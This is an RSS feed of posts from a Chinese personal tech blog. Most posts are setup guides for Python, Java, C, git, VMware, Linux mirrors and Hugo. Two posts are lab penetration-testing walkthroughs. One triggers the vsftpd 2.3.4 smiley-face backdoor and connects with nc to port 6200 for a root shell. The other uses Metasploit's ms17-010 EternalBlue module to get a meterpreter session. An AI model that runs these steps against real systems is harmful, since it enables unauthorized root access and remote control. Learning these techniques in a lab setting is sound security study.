<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on cjj-blog</title>
    <link>https://example.com/post/</link>
    <description>Recent content in Posts on cjj-blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 13 Jun 2021 18:45:05 +0800</lastBuildDate><atom:link href="https://example.com/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>vsftp笑脸漏洞</title>
      <link>https://example.com/p/vsftp%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Sun, 13 Jun 2021 18:45:05 +0800</pubDate>
      
      <guid>https://example.com/p/vsftp%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/</guid>
      <description>介绍： VSFTP是一个基于GPL发布的类Unix系统上使用的FTP服务器软件，它的全称是Very Secure FTP 。
vsftpd-2.3.4早期版本存在恶意的后门，通过登录名中嵌入 :) 两个连续符号而触发的漏洞，因外形酷似笑脸而得名。
演示   扫描目的主机
打开kali使用nmap对目的主机进行扫描(目的主机地址为192.168.43.9)
nmap --script ftp-vsftpd-backdoor 192.168.43.9 
  触发笑脸漏洞
在命令行里接着用ftp尝试登录目的主机
ftp 192.168.43.9
这里提示我们输入用户名，我们目的是拿到最高权限，即用root账户登录靶机
用户名我们输入root：）
密码随便输入后点击回车等待

  开始渗透靶机
打开一个新的命令行，用nc连接靶机
nc 192.168.43.9 6200回车后现在就已经连接上了靶机

验证下是否渗透成功
输入id查看当前登录用户

看到确实是root用户登录
  </description>
    </item>
    
    <item>
      <title>永恒之蓝</title>
      <link>https://example.com/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</link>
      <pubDate>Sun, 13 Jun 2021 18:28:05 +0800</pubDate>
      
      <guid>https://example.com/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</guid>
      <description>永恒之蓝漏洞渗透测试   开启渗透测试工具msfconsole
打开终端输入msfconsole回车
  
 找到永恒之蓝漏洞
搜索永恒之蓝漏洞代号ms17-010
search ms17-010  
这里2号就是我们要找的漏洞
选择这个漏洞
use 2
 设置添加字段
可以使用show options查看当前漏洞的可选选项
  
这里有两个必须添加的字段：RHOSTS和RPORT
set rhosts 192.168.43.252set rport 445
 开始渗透
输入run 或 explit开始渗透

当看到meterpreter即为成功，现在就可以像操作目标主机的命令行一样操作主机了
例如，屏幕分享
screenshare
这时会打开浏览器将目的主机的页面实时显示在浏览器页面</description>
    </item>
    
    <item>
      <title>Python虚拟环境</title>
      <link>https://example.com/p/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</link>
      <pubDate>Sun, 16 May 2021 17:43:02 +0800</pubDate>
      
      <guid>https://example.com/p/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</guid>
      <description>python虚拟环境 1. 什么是虚拟环境 ​	python虚拟环境是独立于已经安装的python环境的环境，各个环境之间互不影响。比如我正在学习python爬虫，我可以创建一个名为spider的虚拟环境专门放置与爬虫有关的包，过段时间我学习Django，可以创建一个名为dj的环境安装Django。
​	不仅仅是方便管理，虚拟环境还能减少环境冲突和包之间的冲突以及其他不必要的麻烦，比如以下场景：
  项目A使用的是Django1.9，而项目B需要Django2.1
  项目A使用python2.7，项目B使用python3.8
  2. 虚拟环境管理包（virtualenvwrapper） 2.1 下载管理包 打开命令行，用pip安装virtualenvwrapper
  Windows下：
pip install virtualenvwrapper-win   linux下：
pip install virtuallenvwrapper   2.2 常用操作   创建虚拟环境（创建后会自动进入创建的虚拟环境）
mkvirtualenv &amp;lt;name&amp;gt; 为虚拟环境的名称
  退出虚拟环境
deactivate   进入虚拟环境
workon &amp;lt;name&amp;gt; 进入虚拟环境后用pip安装python包只会安装在该虚拟环境下
  删除虚拟环境
rmvirtualenv &amp;lt;name&amp;gt;   3. 第三房包管理工具（anaconda） 3.1 下载anaconda 下载地址：https://www.anaconda.com/download/
3.2 常用操作   环境操作
  创建虚拟环境</description>
    </item>
    
    <item>
      <title>Java开发环境配置</title>
      <link>https://example.com/p/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sun, 09 May 2021 17:55:26 +0800</pubDate>
      
      <guid>https://example.com/p/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>安装JDK   下载jdk安装包
进入jdk官方下载页面，选择合适的版本进行下载

  双击运行jdk安装包

  点击下一步后，选择安装路径
建议创建一个java目录将jdk和jre安装在内

  点击下一步开始安装，安装过程会弹出jre的安装，开始进行下一步操作
  安装JRE   选择合适的jre的安装路径

  点击下一步进行安装，安装完成后点击关闭，就可以开始配置环境变量了

  配置环境变量   右击此电脑，点击属性

  选择高级系统设置，在弹出的窗口中点击环境变量

  从用户变量和系统变量中任意选择一个位置进行环境变量的配置

用户变量只在当前Windows用户下有效，若切换成其他用户（如administrator用户），此处的环境变量不生效。而系统变量则在所有用户下均有效。这里使用用户变量演示
  创建一个JAVA_HOME变量，选择新建，变量值为jdk的安装路径

  创建CLASSPATH变量，变量值为
.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; 
  找到Path，双击进行编辑，添加如下两个变量
%JAVA_HOME%\bin %JAVA_HOME%\jre\bin</description>
    </item>
    
    <item>
      <title>Python开发环境配置</title>
      <link>https://example.com/p/python%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sun, 09 May 2021 17:55:19 +0800</pubDate>
      
      <guid>https://example.com/p/python%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>Windows下的安装   进入python官方下载页面下载合适版本的Python

  双击运行，勾选Add Python 3.6 to PATH，并选择第二项自定义安装Python

勾选的选项为给Python添加环境变量，这一步很重要，若此处忘记勾选，安装成功后也要手动添加环境变量
  检查是否全部勾选，点击下一步

  勾选Install for all users，然后选择合适的安装路径，点击下一步

  点击install弹出的提示框中点击是，则开始安装

  安装成功后点击close关闭安装窗口，打开命令行检查是否安装成功，输入python后回车

至此，Python3.6安装成功
  Linux下的安装 Linux自带Python环境，但版本较低，不太适合现在的开发
apt安装   打开终端输入
sudo apt-get install python3.6   下载pip包管理工具
linux下载的python不会附带pip包管理工具的安装，需要额外手动安装
sudo apt-get install python3-pip   离线包解压安装  下载Linux版python包 解压 安装 安装pip  </description>
    </item>
    
    <item>
      <title>C语言开发环境配置</title>
      <link>https://example.com/p/c%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sun, 09 May 2021 17:55:05 +0800</pubDate>
      
      <guid>https://example.com/p/c%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>Windows10下的部署   下载C/C++编译器MinGW64压缩包，解压到合适的位置
下载地址：https://wwe.lanzous.com/iCIlQdq2r1e

  进入解压后的目录下的bin文件夹，复制该文件夹的路径

  桌面上右击此电脑，依次点击 属性/高级系统设置/环境变量，进入环境变量的编辑界面

  双击Path，将刚刚复制的地址粘贴进去

  填好路径后，一直点击确定以保存更改。最后检查是否配置成功
打开命令行，输入gcc -v后回车查看C语言编译器是否配置成功

随后输入g++ -v 和 gdb -v 检查C++和调试器是否配置成功
  至此，Windows下的C/C++环境配置成功
Linux下的配置 Linux下的环境配置更简单，几行命令就完事
  打开终端，输入以下命令下载安装C编译器
sudo apt-get install gcc   安装C++编译器
sudo apt-get install g++   安装gdb调试器
sudo apt-get install gdb   检查是否安装成功
gcc -v g++ -v gdb -v   </description>
    </item>
    
    <item>
      <title>VMware Tools的安装</title>
      <link>https://example.com/p/vmware-tools%E7%9A%84%E5%AE%89%E8%A3%85/</link>
      <pubDate>Sun, 09 May 2021 17:39:00 +0800</pubDate>
      
      <guid>https://example.com/p/vmware-tools%E7%9A%84%E5%AE%89%E8%A3%85/</guid>
      <description>VMware Tools的安装 VMware Tools是VMware虚拟机的增强功能，在VMware的虚拟机内安装VMware tools能够大大提升我们操作虚拟机的体验
  显著提升虚拟机的性能
主要为图形显示性能，例如鼠标卡顿
  实现自适应窗口大小
当调整VMware窗口大小时，内部的虚拟机可以自动调整分辨率来适应窗口
  实现虚拟机、宿主机文件拖拽
最实用的功能，不必解释
  Windows下的安装 vmware对Windows有良好的支持，得益于Windows的图形化操作界面，Windows系统安装VMware是最容易的，具体步骤如下（此处以Windows LTSC为例）：
  安装好Windows虚拟机后，在选项栏选择 workstation/虚拟机/安装VMware Tools

  打开此电脑发现检测到驱动器，双击运行

  开始安装，无脑下一步即可

  安装完成后虚拟机界面可能会有缩放，说明VMware安装成功，重启虚拟机

  Linux下的安装 ​	Linux需要借助命令行进行安装（最新版的Ubuntu20.4图形化操作貌似已可以实现）
kali Linux如果是虚拟机版会自带VMwareTools
  在选项栏选择 workstation/虚拟机/安装VMware Tools，应用栏会出现一个DVD图标，点进去

  将里面的.tar.gz安装包复制出来

  解压刚刚复制出来的压缩包
tar -xzvf [.tar.gz压缩包文件名]</description>
    </item>
    
    <item>
      <title>linux安装软件</title>
      <link>https://example.com/p/linux%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/</link>
      <pubDate>Fri, 07 May 2021 18:45:05 +0800</pubDate>
      
      <guid>https://example.com/p/linux%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/</guid>
      <description>1. apt安装 需要知道需要安装的软件在apt源中的包名
命令
sudo apt-get install &amp;lt;软件名&amp;gt; 卸载
sudo apt-get remove &amp;lt;软件名&amp;gt; 2. deb包安装 deb包是基于Debian linux的发行版的软件安装包，其中，Ubuntu、kali都是基于Debian的linux发行版
2.1 下载要安装的deb包 以VScode为例，桌面上是一个已经下载好的vscodedeb安装包

2.3 命令行安装 在deb包所在位置打开终端，执行安装命令
sudo dpkg -i &amp;lt;包名&amp;gt;
2.4 添加快捷方式 安装好之后，不会像Windows一样自动创建桌面快捷方式，需要手动创建
首先找到安装好的VScode，点开左上角的kali图标，搜索

拖动到桌面就可以，此时deb安装包可以删除了</description>
    </item>
    
    <item>
      <title>git操作</title>
      <link>https://example.com/p/git%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Mon, 26 Apr 2021 21:28:38 +0800</pubDate>
      
      <guid>https://example.com/p/git%E6%93%8D%E4%BD%9C/</guid>
      <description>git环境部署   本地安装git
去git官网下载git软件，安装过程无脑下一步就行
安装成功后在鼠标右击目录下会多出两项

Git GUI：图形界面的Git，不建议初学者使用，尽量先熟悉常用命令
Git Bash：Unix与Linux风格的命令行，使用最多，推荐最多
  设置用户名和邮箱
你需要告诉本地git软件，你是一个有用户名、有邮箱的合法用户，若不设置，commit时会阻止提交到本地仓库
git config --global user.name &amp;#34;用户&amp;#34; git config --global user.email 邮箱   搭建本地仓库
有两种方式：
  文件夹初始化成本地仓库
新建一个文件夹，作为本地仓库，即工作目录，右击选择Git Bash Here，执行初始化命令
git init   克隆远程仓库
将远程服务器上的仓库复制一份至本地
git clone [url]     使用码云
生成公钥
 进入用户文件夹，比如 C:\Users\Administrator，找到.ssh文件夹 进入.ssh文件夹，文件夹内右击选择Git Bash Here 执行 ssh-keygen 生成公钥，此时文件夹内会生成两个文件id_rsa和id_rsa.pub  设置公钥
 打开设置  
  进入SSH公钥选项</description>
    </item>
    
    <item>
      <title>桥接模式</title>
      <link>https://example.com/p/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Sun, 25 Apr 2021 22:58:38 +0800</pubDate>
      
      <guid>https://example.com/p/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/</guid>
      <description>虚拟机桥接模式 桥接模式就是将主机网卡与虚拟机的网卡利用虚拟网桥进行通信。
在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。
在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致
桥接模式配置 查看需要桥接的网卡   右击右下角网络图标点击打开网络和Internet设置1
  下滑找到查看网络属性2
  找到正在使用的网卡
比如我现在正在使用无线网络，到这里找到有关于此网络的信息，包括我们现在要找的无线网卡名称
3
  设置桥接网卡 打开vmware，点击编辑、虚拟网络编辑器，将桥接的网卡设置成刚刚查看到的网卡
4
注：若系统账户不是Administrator，会提示权限不够，打开VMware时右击以管理员身份运行就可以了
虚拟机内部网IP配置 以Ubuntu20.04为例
 点击右上角的网络图标、有线、有线设置  
 在有线一栏点击齿轮、IPV4

  开始配置IP
 IPV4方式：手动 地址：  地址：设置成与宿主机同一网段下的其他IP地址 子网掩码：与宿主机保持一致 网关：与宿主机保持一致   DNS：与宿主机保持一致 路由：自动就好    校园网的桥接问题 如果宿主机连接的是类似校园网这种需要认证的网络时，会有如下问题：
  设置虚拟机内的IP地址时，除了宿主机的IP地址，其他的地址均无法上网
  如果虚拟机设置成宿主机一样的IP，会导致宿主机无法正常连接网络
  造成这种现象的原因是：虚拟机桥接网络时，这个虚拟机就相当于连接校园网的另一台主机，这台主机也需要像宿主机一样通过认证才允许连接网络</description>
    </item>
    
    <item>
      <title>linux换源</title>
      <link>https://example.com/p/linux%E6%8D%A2%E6%BA%90/</link>
      <pubDate>Sat, 24 Apr 2021 22:38:06 +0800</pubDate>
      
      <guid>https://example.com/p/linux%E6%8D%A2%E6%BA%90/</guid>
      <description>换源   打开kali的终端
1
  编辑软件源，输入
sudo vi /etc/apt/sources.list 2
  如果是非root的普通账户，会提示需要输入登录密码（2020版本后的默认用户kali也是普通用户），输入密码后回车进入软件源页面
3
  点击键入 i 进入编辑模式（此时窗口左下角会显示INSERT或插入），注释掉官方源
4
  添加国内源
阿里云：
deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb http://mirrors.aliyun.com/kali-security kali-rolling/updates main contrib non-free 中科大：
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 5
  按Esc退出编辑模式，然后输入:wq（保存并退出），回车</description>
    </item>
    
    <item>
      <title>Hugo</title>
      <link>https://example.com/p/hugo/</link>
      <pubDate>Sat, 24 Apr 2021 21:05:28 +0800</pubDate>
      
      <guid>https://example.com/p/hugo/</guid>
      <description>环境部署   安装git
sudo apt-get install git   安装hugo
sudo apt-get install hugo   项目搭建   创建hugo 项目
hugo new site myblog 注：
 myblog为创建的hugo项目的根目录名称    克隆一个主题
cd myblog git clone https://github.com/vaga/hugo-theme-m10c.git themes/m10c 注：
 如果cd到项目根目录，clone的地址后面需加上路径 “themes/主题名” 如果cd到themes目录，直接git clone 地址    新建一个博客
hugo new post/blog.md 注：
 在post目录下新建一个名为blog.md的博客文件 .md为Markdown格式的文件    修改配置文件
baseURL = &amp;quot;https://tian_828.gitee.io/&amp;quot;languageCode = &amp;quot;zh-cn&amp;quot;title = &amp;quot;靖哥的博客&amp;quot;theme = &amp;quot;m10c&amp;quot;注：</description>
    </item>
    
  </channel>
</rss>
